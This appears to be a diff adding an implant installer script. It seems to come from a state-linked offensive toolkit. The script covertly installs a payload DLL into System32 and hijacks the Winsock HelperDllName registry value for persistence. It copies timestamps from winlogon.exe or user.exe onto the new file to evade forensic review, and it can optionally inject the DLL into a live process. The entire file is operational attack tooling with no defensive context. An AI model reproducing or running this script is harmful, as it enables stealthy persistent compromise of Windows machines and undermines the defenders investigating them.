@@ -1,0 +1,220 @@
+
+@include "_File.dsi"; 
+@include "_Paths.dsi";
+@include "_Processes.dsi";
+@include "_Versions.dsi";
+@include "windows/_RegistryIncludes.dsi";
+@echo off;
+@disablewow64 on;
+
+if ($argc != 3)
+{
+	echo("* Invalid parmeters", ERROR);
+	echo();
+	echo("Usage: $argv[0] <localFile> <procName>");
+	return false;
+}
+
+string $localFile = $argv[1];
+string $procName = $argv[2];
+string $regKey		= "SYSTEM\\CurrentControlSet\\Services\\Tcpip\\Parameters\\Winsock";
+string $regKeyValue	= "HelperDllName";
+
+string $arch;
+_GetArch($arch);
+
+# get the system path
+string $sysPath;
+if (!_GetSystemPath($sysPath))
+{
+	echo("* Failed to get system path", ERROR);
+	return false;
+}
+
+echo("", WARNING);
+echo("NOTE: In order to use HelperDllName as your install point, the process for which", WARNING);
+echo("      PC is configured must load wshtcpip.dll. The install path is $sysPath", WARNING);
+
+# get the HelperDllName value
+string $origKeyValue;
+if (!_GetRegistryValue("L", 
+					   $regKey,
+					   $regKeyValue,
+					   $origKeyValue) || !defined($origKeyValue))
+{
+	$origKeyValue = "";
+}
+
+string $installPath = "\%\%SystemRoot\%\%\\System32";
+
+if ($origKeyValue != "$installPath\\wshtcpip.dll")
+{
+	echo("* Non-standard WSH value found ($origKeyValue)", WARNING);
+	if (!prompt("Do you want to continue?", false))
+	{
+		return false;
+	}
+}
+
+# get the process id for injection
+int $id;
+if (prompt("Do you want to perform injection (for instant-grat)?"))
+{
+	if (StrLen($procName) > 0)
+	{
+		if (!_FindProcessOnList($procName, $id) || !defined($id))
+		{
+			echo("* Failed to find $procName", ERROR);
+		}
+	}
+
+	# make sure the user wants to keep going if we don't have a process
+	if (!defined($id))
+	{
+		echo("No process for injection", ERROR);
+		if (!prompt("Continue?"))
+		{
+			return false;
+		}
+	}
+}
+# get install name
+string $installName = "wshencrp.dll";
+if (!GetInput("PC DLL install name", $installName, $installName))
+{
+	echo("* Failed to get install name", ERROR);
+	return false;
+}
+
+if(RegexMatch("[\\\\/]",$installName))
+{
+	echo("* Paths are not allowed in install name", ERROR);
+	return false;
+}
+
+# upload the file
+echo "Uploading PC";
+if (!`put "$localFile" -name "$sysPath\\$installName" -permanent`)
+{
+	echo("    FAILED", ERROR);
+	pause;
+	return false;
+}
+echo("    FINISHED", GOOD);
+
+# matchtimes on the file
+string $matchName = "user.exe";
+if ($arch == "x64")
+{
+	$matchName = "winlogon.exe";
+}
+echo "Matching filetimes with $matchName";
+if (!`matchfiletimes -src "$sysPath\\$matchName" -dst "$sysPath\\$installName"`)
+{
+	echo("    FAILED", ERROR);
+	pause;
+	# continue...
+}
+else
+{
+	echo("    FINISHED", GOOD);
+}
+
+# Fix breakage of 32-bit network-using binaries that point to SysWOW64-equivalent helper dll.
+if ($arch == "x64")
+{
+	# In the normal case, the "orig" file will exist, use that (would be a copy of wshtcpip if PC installed).
+	# Otherwise, fall back to wshtcpip.dll (someone else broke it, we'll fix it anyway).
+	echo "Copying SysWOW64 helper DLL";
+	string $origSW64Dll;
+	$origSW64Dll = $origKeyValue;
+	@regex-global on;
+	RegExSub("^.*\\\\", "", $origSW64Dll);
+	@regex-global off;
+	$origSW64Dll = "$sysPath\\$origSW64Dll";
+	RegExSub("system32","SysWOW64",$origSW64Dll);
+	if(!_FileExists($origSW64Dll))
+	{
+		echo("    Falling back to original filename (no $origSW64Dll)", WARNING);
+		$origSW64Dll = "$sysPath\\wshtcpip.dll";
+		RegExSub("system32","SysWOW64",$origSW64Dll);
+	}
+	if(!_FileExists($origSW64Dll))
+	{
+		echo("    FAILED (no $origSW64Dll)", ERROR);
+		pause;
+		# continue...
+	}
+	else
+	{
+		string $homonymousDll;
+		$homonymousDll = "$sysPath\\$installName";
+		RegExSub("system32","SysWOW64",$homonymousDll);
+		if(!`copy $origSW64Dll $homonymousDll`)
+		{
+			echo("    FAILED (could not copy source)", ERROR);
+			pause;
+			# continue...
+		}
+		else
+		{
+			echo("    FINISHED", GOOD);
+			echo "Matching SysWOW64 filetimes";
+			if (!`matchfiletimes -src "$origSW64Dll" -dst "$homonymousDll"`)
+			{
+				echo("    FAILED (times not matched)", ERROR);
+				pause;
+				# continue...
+			}
+			else
+			{
+				echo("    FINISHED", GOOD);
+			}
+		}
+	}
+}
+
+# update the registry key
+echo "Updating registry";
+if (!_SetRegistryValue("L", 
+					   $regKey,
+					   $regKeyValue,
+					   "$installPath\\$installName",
+					   "REG_EXPAND_SZ"))
+{
+	echo("    FAILED", ERROR);
+	echo "Deleting PC";
+	if (!`delete -file "$sysPath\\$installName"`)
+	{
+		echo("    FAILED", ERROR);
+	}
+	else
+	{
+		echo("    DELETED", GOOD);
+	}
+	pause;
+	return false;
+}
+echo("    SET", GOOD);
+
+if (defined($id))
+{
+	# inject the DLL
+	echo "Injecting DLL";
+	if (!`injectdll -library "$sysPath\\$installName" -id $id`)
+	{
+		echo("    FAILED", ERROR);
+	}
+	else
+	{
+		echo("    INJECTED", GOOD);
+	}
+}
+
+echo "Install Finished";
+echo "$regKeyValue before : '$origKeyValue'";
+echo " $regKeyValue after : '$installPath\\$installName'";
+
+pause;
+return true;
+
